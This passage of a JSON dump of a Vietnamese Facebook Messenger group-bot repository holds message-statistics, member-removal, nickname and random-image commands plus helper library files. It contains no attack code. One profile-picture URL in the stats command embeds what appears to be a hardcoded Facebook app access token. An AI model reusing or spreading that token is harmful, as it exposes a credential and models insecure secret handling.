continue;\n          const userWeek = threadData.week.find(e => e.id == user);\n          if (!userWeek || userWeek.count < minCount) {\n            usersToRemove.push(user);\n          }\n        }\n      \n        if (usersToRemove.length === 0) {\n            return api.sendMessage(`‚úÖ Kh√¥ng c√≥ th√†nh vi√™n n√†o d∆∞·ªõi ${minCount} tin nh·∫Øn.`, threadID);\n          }\n          \n          let msg = `üìä C√≥ ${usersToRemove.length} th√†nh vi√™n d∆∞·ªõi ${minCount} tin nh·∫Øn trong 7 ng√†y g·∫ßn ƒë√¢y:\\n\\n`;\nlet index = 1;\n\nfor (const uid of usersToRemove) {\n  const name = (await api.getUserInfo(uid))[uid]?.name || \"Kh√¥ng r√µ t√™n\";\n  const userWeek = threadData.week.find(e => e.id == uid);\n  const count = userWeek ? userWeek.count : 0;\n  msg += `${index++} ‚Üí ${name} : ${count} tin nh·∫Øn\\n`;\n}\n\n          msg += `\\nüëâ B·∫°n c√≥ mu·ªën l·ªçc nh·ªØng th√†nh vi√™n n√†y kh√¥ng?\\nVui l√≤ng reply v√†o tin nh·∫Øn n√†y: \"c√≥\" ho·∫∑c \"kh√¥ng\".`;\n          \n          api.sendMessage(msg, threadID, (err, info) => {\n            global.client.handleReply.push({\n              type: \"reply_locmem\",\n              name: this.config.name,\n              messageID: info.messageID,\n              author: senderID,\n              threadID,\n              usersToRemove,\n              minCount\n            });\n          });\n        return;\n      }   \n\n    var header = '',\n        body = '',\n        footer = '',\n        msg = '',\n        count = 1,\n        storage = [],\n        data = 0;\n    if (query == 'all' || query == '-a') {\n        header = '===ùóßùó®Ãõùó¢Ãõùó°ùóö ùóßùóîÃÅùóñ ùóîùóüùóü===\\n';\n        data = threadData.total;\n    } else if (query == 'week' || query == '-w') {\n        header = '===ùóßùó®Ãõùó¢Ãõùó°ùóö ùóßùóîÃÅùóñ ùóßùó®ùóîÃÇÃÄùó°===\\n';\n        data = threadData.week;\n    } else if (query == 'day' || query == '-d') {\n        header = '===ùóßùó®Ãõùó¢Ãõùó°ùóö ùóßùóîÃÅùóñ ùó°ùóöùóîÃÄùó¨===\\n';\n        data = threadData.day;\n    } else {\n        data = threadData.total;\n    }\n    for (const item of data) {\n        const userName = await Users.getNameUser(item.id) || 'T√™n kh√¥ng t·ªìn t·∫°i';\n        const itemToPush = item;\n        itemToPush.name = userName;\n        storage.push(itemToPush);\n    };\n    let check = ['all', '-a', 'week', '-w', 'day', '-d'].some(e => e == query);\n    if (!check && Object.keys(mentions).length > 0) {\n        storage = storage.filter(e => mentions.hasOwnProperty(e.id));\n    }\n    //sort by count from high to low if equal sort by name\n    storage.sort((a, b) => {\n        if (a.count > b.count) {\n            return -1;\n        }\n        else if (a.count < b.count) {\n            return 1;\n        } else {\n            return a.name.localeCompare(b.name);\n        }\n    });\n    if ((!check && Object.keys(mentions).length == 0) || (!check && Object.keys(mentions).length == 1) || (!check && event.type == 'message_reply')) {\n        const UID = event.messageReply ? event.messageReply.senderID : Object.keys(mentions)[0] ? Object.keys(mentions)[0] : senderID;\n        const userRank = storage.findIndex(e => e.id == UID);\n        const userTotal = threadData.total.find(e => e.id == UID) ? threadData.total.find(e => e.id == UID).count : 0;\n        const userTotalWeek = threadData.week.find(e => e.id == UID) ? threadData.week.find(e => e.id == UID).count : 0;\n        const userTotalDay = threadData.day.find(e => e.id == UID) ? threadData.day.find(e => e.id == UID).count : 0;\n        const nameUID = storage[userRank].name || 'T√™n kh√¥ng t·ªìn t·∫°i';\n        const target = UID == senderID ? 'B·∫°n' : nameUID;\n      const moment = require(\"moment-timezone\");\n  const timeNow = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"DD/MM/YYYY || HH:mm:ss\");\n      var permission;\n        if (global.config.ADMINBOT.includes(UID)) permission = `Admin Bot`;\nelse if\n(global.config.NDH.includes(UID)) \npermission = `Ng∆∞·ªùi H·ªó Tr·ª£`; else if (threadInfo.adminIDs.some(i => i.id == UID)) permission = `Qu·∫£n Tr·ªã Vi√™n`; else permission = `Th√†nh Vi√™n`;\n      var thu = moment.tz('Asia/Ho_Chi_Minh').format('dddd');\n  if (thu == 'Sunday') thu = 'ùêÇùê°ùêÆÃâ ùêçùê°ùêöÃ£ÃÇùê≠'\n  if (thu == 'Monday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêáùêöùê¢'\n  if (thu == 'Tuesday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêÅùêö'\n  if (thu == 'Wednesday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêìùêÆÃõ'\n  if (thu == \"Thursday\") thu = 'ùêìùê°ùêÆÃõÃÅ ùêçùêöÃÜùê¶'\n  if (thu == 'Friday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêíùêöÃÅùêÆ'\n  if (thu == 'Saturday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêÅùêöÃâùê≤'\n      let threadName = threadInfo.threadName;\n        if (userRank == -1) {\n            return api.sendMessage(`‚Üí ${target} ch∆∞a c√≥ th·ªëng k√™ d·ªØ li·ªáu`, threadID);\n        }\n        body +=\n          `==== [ ùóñùóõùóòùóñùóû ùóßùó®Ãõùó¢Ãõùó°ùóö ùóßùóîÃÅùóñ ] ====\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n\\n[üë§] ‚Üí ùó°ùóÆùó∫ùó≤: ${nameUID}\\n[üå∏] ‚Üí ùóúùóó: ${UID}\\n[üíì] ‚Üí ùóñùóµùòÇÃõÃÅùó∞ ùòÉùòÇÃ£: ${permission}\\n[üî∞] ‚Üí ùóßùó≤ÃÇùóª ùóªùóµùóºÃÅùó∫: ${threadName}\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n[üíå] ‚Üí ùóßùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùòÅùóøùóºùóªùó¥ ùóªùó¥ùóÆÃÄùòÜ: ${userTotalDay}\\n[üíì] ‚Üí ùóõùóÆÃ£ùóªùó¥ ùòÅùóøùóºùóªùó¥ ùóªùó¥ùóÆÃÄùòÜ: ${count++}\\n[üí¨] ‚Üí ùóßùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùòÅùóøùóºùóªùó¥ ùòÅùòÇùóÆÃÇÃÄùóª: ${userTotalWeek}\\n[üíù] ‚Üí ùóõùóÆÃ£ùóªùó¥ ùòÅùóøùóºùóªùó¥ ùòÅùòÇùóÆÃÇÃÄùóª: ${count++}\\n[üåü] ‚Üí ùóßùóºÃÇÃâùóªùó¥ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª: ${userTotal}\\n[ü•á] ‚Üí ùóõùóÆÃ£ùóªùó¥ ùòÅùóºÃÇÃâùóªùó¥:  ${userRank + 1}\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\nüí¢ ùó°ùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ ùòÅùóµùóºÃÇùóªùó¥ ùòÅùó∂ùóª ùóªùóµùóºÃÅùó∫ ùóØùóÆÃ£ùóª ùòÅùóµùóÆÃâ ùó∞ùóÆÃâùó∫ ùòÖùòÇÃÅùó∞ \"‚ù§\" ùòÉùóÆÃÄùóº ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùó∞ùòÇÃâùóÆ ùóØùóºùòÅ\\nüå∏ ùêè/ùêí: ùêúùê°ùêûùêúùê§ùê≠ùê≠ ùêùùêöùê≤/ùê∞ùêûùêûùê§/ùêöùê•ùê•/ùê•ùê®ùêúùê¶ùêûùê¶`.replace(/^ +/gm, '');\n    } else {\n        body = storage.map(item => {\n            return `${count++}. ${item.name} (${item.count})`;\n        }).join('\\n');\n        footer = `‚Üí T·ªïng Tin Nh·∫Øn: ${storage.reduce((a, b) => a + b.count, 0)}`;\n    }\n  async function streamURL(url, mime='jpg') {\n    const dest = `${__dirname}/cache/${Date.now()}.${mime}`,\n    downloader = require('image-downloader'),\n    fse = require('fs-extra');\n    await downloader.image({\n        url, dest\n    });\n    setTimeout(j=>fse.unlinkSync(j), 60*1000, dest);\n    return fse.createReadStream(dest);\n};\n    msg = `${header}\\n${body}\\n${footer}`;\n    api.sendMessage({body: msg, attachment: [await streamURL(threadInfo.imageSrc), await streamURL(`\nhttps://graph.facebook.com/${event.senderID}/picture?height=720&width=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`)]}, threadID, (err, info) => {\n    global.client.handleReaction.push({\n      name: this.config.name, \n      messageID: info.messageID,\n      author: event.senderID,\n    })\n    },event.messageID);\n                     }\nmodule.exports.handleReaction = async ({ event, api, handleReaction, Currencies, Users}) => {\nconst axios = global.nodemodule[\"axios\"];\nconst fs = global.nodemodule[\"fs-extra\"];\nconst { threadID, messageID, userID } = event;\n  async function streamURL(url, mime='jpg') {\n    const dest = `${__dirname}/cache/${Date.now()}.${mime}`,\n    downloader = require('image-downloader'),\n    fse = require('fs-extra');\n    await downloader.image({\n        url, dest\n    });\n    setTimeout(j=>fse.unlinkSync(j), 60*1000, dest);\n    return fse.createReadStream(dest);\n};\n  let threadInfo = await api.getThreadInfo(event.threadID);\n  let threadName = threadInfo.threadName;\n  let id = threadInfo.threadID;\n  let sex = threadInfo.approvalMode;\n  var pd = sex == false ? 'T·∫Øt' : sex == true ? 'B·∫≠t' : '\\n';\n  let qtv = threadInfo.adminIDs.length;\nlet color = threadInfo.color;\n  let icon = threadInfo.emoji;\n  let threadMem = threadInfo.participantIDs.length;\nif (event.userID != handleReaction.author) return;\nif (event.reaction != \"‚ù§\") return; \n api.unsendMessage(handleReaction.messageID);\n        var msg = `=====„Äå ùóßùóõùó¢ÃÇùó°ùóö ùóßùóúùó° ùó°ùóõùó¢ÃÅùó† „Äç=====\\n\\nüèòÔ∏è ùóßùó≤ÃÇùóª ùóªùóµùóºÃÅùó∫: ${threadName}\\n‚öôÔ∏è ùóúùóó ùóªùóµùóºÃÅùó∫: ${id}\\nüë• ùó¶ùóºÃÇÃÅ ùòÅùóµùóÆÃÄùóªùóµ ùòÉùó∂ùó≤ÃÇùóª ùóªùóµùóºÃÅùó∫: ${threadMem}\\nüíû ùó§ùòÇùóÆÃâùóª ùòÅùóøùó∂Ã£ ùòÉùó∂ùó≤ÃÇùóª: ${qtv}\\nüå∑ ùó£ùóµùó≤ÃÇ ùó±ùòÇùòÜùó≤ÃÇÃ£ùòÅ: ${pd}\\nüòª ùóïùó∂ùó≤ÃÇÃâùòÇ ùòÅùòÇÃõùóºÃõÃ£ùóªùó¥ ùó∞ùóÆÃâùó∫ ùòÖùòÇÃÅùó∞: ${icon ? icon : 'Kh√¥ng s·ª≠ d·ª•ng'}\\nüíù ùó†ùóÆÃÉ ùó¥ùó∂ùóÆùóº ùó±ùó∂ùó≤ÃÇÃ£ùóª: ${color}\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\nüí≠ ùóßùóºÃÇÃâùóªùó¥ ùòÄùóºÃÇÃÅ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùó∞ùòÇÃâùóÆ ùóªùóµùóºÃÅùó∫: ${threadInfo.messageCount}\\nüå∏ ùêè/ùêí: ùêúùê°ùêûùêúùê§ùê≠ùê≠ ùêùùêöùê≤/ùê∞ùêûùêûùê§/ùêöùê•ùê•/ùê•ùê®ùêúùê¶ùêûùê¶ `\n        return api.sendMessage({body: msg, attachment: await streamURL(threadInfo.imageSrc)},event.threadID,event.messageID);\n}\n\nmodule.exports.handleReply = async function ({ api, event, handleReply }) {\n    const { threadID, senderID, messageID, body } = event;\n  \n    if (handleReply.type == \"reply_locmem\" && handleReply.author == senderID) {\n      const answer = body.trim().toLowerCase();\n      if (answer != \"c√≥\" && answer != \"co\" && answer != \"yes\") {\n        return api.sendMessage(\"l·ªçc th√†nh vi√™n ƒë√£ b·ªã h·ªßy b·ªè.\", threadID);\n      }\n  \n      const fs = require(\"fs\");\n      const threadData = JSON.parse(fs.readFileSync(path + threadID + \".json\"));\n      const usersToRemove = handleReply.usersToRemove;\n  \n      api.sendMessage(`B·∫Øt ƒë·∫ßu x√≥a ${usersToRemove.length} th√†nh vi√™n...`, threadID, () => {\n        let delay = 1000;\n        for (let i = 0; i < usersToRemove.length; i++) {\n          const user = usersToRemove[i];\n          setTimeout(async () => {\n            try {\n              await api.removeUserFromGroup(user, threadID);\n              for (let e in threadData) {\n                if (Array.isArray(threadData[e])) {\n                  threadData[e] = threadData[e].filter(item => item.id != user);\n                }\n              }\n              fs.writeFileSync(path + threadID + \".json\", JSON.stringify(threadData, null, 4));\n      \n              if (i === usersToRemove.length - 1) {\n                api.sendMessage(` Ho√†n th√†nh! ƒê√£ x√≥a ${usersToRemove.length} th√†nh vi√™n d∆∞·ªõi ${handleReply.minCount} tin nh·∫Øn.`, threadID);\n              }\n            } catch (e) {\n              console.error(` Kh√¥ng th·ªÉ x√≥a ng∆∞·ªùi d√πng ${user}: ${e.message}`);\n            }\n          }, delay * i);\n        }        \n      });      \n    }\n  };","path":null,"size_bytes":18872,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Html/Classic/script.js":{"content":"var c = document.getElementById(\"myCanvas\");\nvar ctx = c.getContext(\"2d\");\nvar mask;\n\nvar pointCount = 500;\nvar str = \"Horizon\";\nvar fontStr = \"bold 100pt Helvetica Neue, Helvetica, Arial, sans-serif\";\n\nctx.font = fontStr;\nctx.textAlign = \"auto\";\nc.width = (ctx.measureText(str).width);\nc.height = 100; // Set to font size\n\nvar whitePixels = [];\nvar points = [];\nvar point = function(x,y,vx,vy){\n  this.x = x;\n  this.y = y;\n  this.vx = vx || 1;\n  this.vy = vy || 1;\n};\npoint.prototype.update = function() {\n  ctx.beginPath();\n  ctx.fillStyle = \"#95a5a6\";\n  ctx.arc(this.x,this.y,1,0,2*Math.PI);\n  ctx.fill();\n  ctx.closePath();\n  \n  // Change direction if running into black pixel\n  if (this.x+this.vx >= c.width || this.x+this.vx < 0 || mask.data[coordsToI(this.x+this.vx, this.y, mask.width)] != 255) {\n    this.vx *= -1;\n    this.x += this.vx*2;\n  }\n  if (this.y+this.vy >= c.height || this.y+this.vy < 0 || mask.data[coordsToI(this.x, this.y+this.vy, mask.width)] != 255) {\n    this.vy *= -1;\n    this.y += this.vy*2;\n  }\n  \n  for (var k = 0, m = points.length; k<m; k++) {\n    if (points[k]===this) continue;\n    \n    var d = Math.sqrt(Math.pow(this.x-points[k].x,2)+Math.pow(this.y-points[k].y,2));\n    if (d < 5) {\n      ctx.lineWidth = .2;\n      ctx.beginPath();\n      ctx.moveTo(this.x,this.y);\n      ctx.lineTo(points[k].x,points[k].y);\n      ctx.stroke();\n    }\n    if (d < 20) {\n      ctx.lineWidth = .1;\n      ctx.beginPath();\n      ctx.moveTo(this.x,this.y);\n      ctx.lineTo(points[k].x,points[k].y);\n      ctx.stroke();\n    }\n  }\n  \n  this.x += this.vx;\n  this.y += this.vy;\n};\n\nfunction loop() {\n  ctx.clearRect(0,0,c.width,c.height);\n  for (var k = 0, m = points.length; k < m; k++) {\n    points[k].update();\n  }\n}\n\nfunction init() {\n  // Draw text\n  ctx.beginPath();\n  ctx.fillStyle = \"#000\";\n  ctx.rect(0,0,c.width,c.height);\n  ctx.fill();\n  ctx.font = fontStr;\n  ctx.textAlign = \"left\";\n  ctx.fillStyle = \"#fff\";\n  ctx.fillText(str,0,c.height/2+(c.height / 2));\n  ctx.closePath();\n  \n  // Save mask\n  mask = ctx.getImageData(0,0,c.width,c.height);\n  \n  // Draw background\n  ctx.clearRect(0,0,c.width,c.height);\n  \n  // Save all white pixels in an array\n  for (var i = 0; i < mask.data.length; i += 4) {\n    if (mask.data[i] == 255 && mask.data[i+1] == 255 && mask.data[i+2] == 255 && mask.data[i+3] == 255) {\n      whitePixels.push([iToX(i,mask.width),iToY(i,mask.width)]);\n    }\n  }\n  \n  for (var k = 0; k < pointCount; k++) {\n    addPoint();\n  }\n}\n\nfunction addPoint() {\n  var spawn = whitePixels[Math.floor(Math.random()*whitePixels.length)];\n  \n  var p = new point(spawn[0],spawn[1], Math.floor(Math.random()*2-1), Math.floor(Math.random()*2-1));\n  points.push(p);\n}\n\nfunction iToX(i,w) {\n  return ((i%(4*w))/4);\n}\nfunction iToY(i,w) {\n  return (Math.floor(i/(4*w)));\n}\nfunction coordsToI(x,y,w) {\n  return ((mask.width*y)+x)*4;\n\n}\n\nsetInterval(loop,50);\ninit();","path":null,"size_bytes":2887,"size_tokens":null},"modules/commands/setname.js":{"content":"module.exports.config = {\n    name: 'setname',\n    version: '3.0.0',\n    hasPermssion: 0,\n    credits: 'Vtuan',\n    description: 'ƒê·ªïi bi·ªát danh trong nh√≥m c·ªßa b·∫°n ho·∫∑c c·ªßa ng∆∞·ªùi b·∫°n tag',\n    commandCategory: 'Qu·∫£n L√≠ Box',\n    usages: '[tr·ªëng/reply/tag] + [name]',\n    cooldowns: 5\n};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    let { threadID, messageReply, senderID, mentions } = event;\n\n    console.log(\"ƒêang th·ª±c hi·ªán l·ªánh setname...\");\n    \n    const mention = Object.keys(mentions)[0];\n    let targetID = event.type === 'message_reply' ? messageReply.senderID : (mention || senderID);\n    \n    const nickname = args.join(' ').replace(mentions?.[mention] || '', '').trim();\n    \n    if (!nickname && mention) {\n        return api.sendMessage('B·∫°n ch∆∞a nh·∫≠p bi·ªát danh m·ªõi.', threadID);\n    }\n\n    try {\n        // Th·ª±c hi·ªán vi·ªác ƒë·ªïi bi·ªát danh\n        await new Promise((resolve, reject) => {\n            api.changeNickname(nickname, threadID, targetID, (err) => {\n                if (err) {\n                    reject(err); // G·ªçi reject ƒë·ªÉ x·ª≠ l√Ω l·ªói\n                } else {\n                    resolve(); // G·ªçi resolve khi th√†nh c√¥ng\n                }\n            });\n        });\n\n        // N·∫øu th√†nh c√¥ng, g·ª≠i tin nh·∫Øn x√°c nh·∫≠n\n        api.sendMessage(`${nickname ? 'Thay ƒë·ªïi' : 'G·ª°'} bi·ªát danh th√†nh c√¥ng!`, threadID);\n    } catch (err) {\n        console.log(\"L·ªói khi thay ƒë·ªïi bi·ªát danh:\", err);\n\n        // G·ª≠i th√¥ng b√°o l·ªói chung cho ng∆∞·ªùi d√πng\n        api.sendMessage('Kh√¥ng ƒë·ªÉ ƒë·∫∑t bi·ªát danh vui l√≤ng t·∫Øt li√™n k·∫øt nh√≥m ho·∫∑c c√≥ th·ªÉ do bot b·ªã ch·∫∑n t√≠nh nƒÉng!!!', threadID);\n    }\n};\n","path":null,"size_bytes":1740,"size_tokens":null},"lib/fca-auto/src/getUserInfoV2.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV2(id, callback) {\n      var resolveFunc = function () { };\n      var rejectFunc = function () { };\n      var returnPromise = new Promise(function (resolve, reject) {\n        resolveFunc = resolve;\n        rejectFunc = reject;\n      });\n  \n      if (!callback) {\n        callback = function (err, userInfo) {\n          if (err) return rejectFunc(err);\n          resolveFunc(userInfo);\n        };\n      }\n    try {\n      var { getInfo } = require('../Extra/ExtraAddons');\n      getInfo(id,ctx.jar,ctx,defaultFuncs)\n        .then(data => {\n          //api.Horizon_Data([data], \"Users\", \"Post\");\n        return callback(null, data);\n      });\n    }\n    catch (e) {\n      return callback(null, e);\n    }\n    return returnPromise;\n    };\n  };","path":null,"size_bytes":873,"size_tokens":null},"modules/commands/g√°i.js":{"content":"module.exports.config = {\n  name: \"g√°i\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/gaivip.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Gh·∫π ƒë·∫πp:3',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1603,"size_tokens":null},"includes/handle/handleReply.js":{"content":"module.exports = function ({ api, models, Users, Threads, Currencies }) {\n    return function ({ event }) {\n        if (!event.messageReply) return;\n        const { handleReply, commands } = global.client\n        const { messageID, threadID, messageReply } = event;\n        if (handleReply.length !== 0) {\n            const indexOfHandle = handleReply.findIndex(e => e.messageID == messageReply.messageID);\n            if (indexOfHandle < 0) return;\n            const indexOfMessage = handleReply[indexOfHandle];\n            const handleNeedExec = commands.get(indexOfMessage.name);\n            if (!handleNeedExec) return api.sendMessage(global.getText('handleReply', 'missingValue'), threadID, messageID);\n            try {\n                var getText2;\n                if (handleNeedExec.languages && typeof handleNeedExec.languages == 'object') \n                \tgetText2 = (...value) => {\n                    const reply = handleNeedExec.languages || {};\n                    if (!reply.hasOwnProperty(global.config.language)) \n                    \treturn api.sendMessage(global.getText('handleCommand', 'notFoundLanguage', handleNeedExec.config.name), threadID, messengeID);\n                    var lang = handleNeedExec.languages[global.config.language][value[0]] || '';\n                    for (var i = value.length; i > -0x4 * 0x4db + 0x6d * 0x55 + -0x597 * 0x3; i--) {\n                        const expReg = RegExp('%' + i, 'g');\n                        lang = lang.replace(expReg, value[i]);\n                    }\n                    return lang;\n                };\n                else getText2 = () => {};\n                const Obj = {};\n                Obj.api = api\n                Obj.event = event \n                Obj.models = models\n                Obj.Users = Users\n                Obj.Threads = Threads \n                Obj.Currencies = Currencies\n                Obj.handleReply = indexOfMessage\n                Obj.models = models\n                Obj.getText = getText2\n                handleNeedExec.handleReply(Obj);\n                return;\n            } catch (error) {\n                return api.sendMessage(global.getText('handleReply', 'executeError', error), threadID, messageID);\n            }\n        }\n    };\n}","path":null,"size_bytes":2242,"size_tokens":null},"modules/commands/chitanda.js":{"content":"module.exports.config = {\n  name: \"chitanda\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 20\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/chitanda.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Chitanda:3',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1605,"size_tokens":null},"lib/fca-auto/Extra/Security/Step_1.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\nmodule.exports.EncryptState = function EncryptState(Data,PassWord) { return CryptoJS.AES.encrypt(Data, PassWord).toString(); };\n\nmodule.exports.DecryptState = function DecryptState(Data,PassWord) { return CryptoJS.AES.decrypt(Data, PassWord).toString(CryptoJS.enc.Utf8); };","path":null,"size_bytes":325,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getThreadMain.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: 